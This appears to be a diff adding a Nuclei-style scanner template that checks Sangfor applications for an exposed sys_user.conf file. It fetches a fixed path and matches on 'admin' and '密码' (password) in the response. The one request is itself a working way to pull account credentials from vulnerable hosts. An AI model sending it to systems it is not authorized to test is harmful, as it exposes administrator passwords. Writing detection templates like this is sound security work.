@@ -1,0 +1,26 @@
+id: sangfor-sysuser-conf
+
+info:
+  name: Sangfor Application sys_user.conf Account Password Leakage
+  author: sangfor
+  severity: high
+  tags: lfi,sangfor,exposure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tmp/updateme/sinfor/ad/sys/sys_user.conf"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "true"
+          - "admin"
+          - "密码"
+        condition: and
+
+      - type: status
+        status:
+          - 200
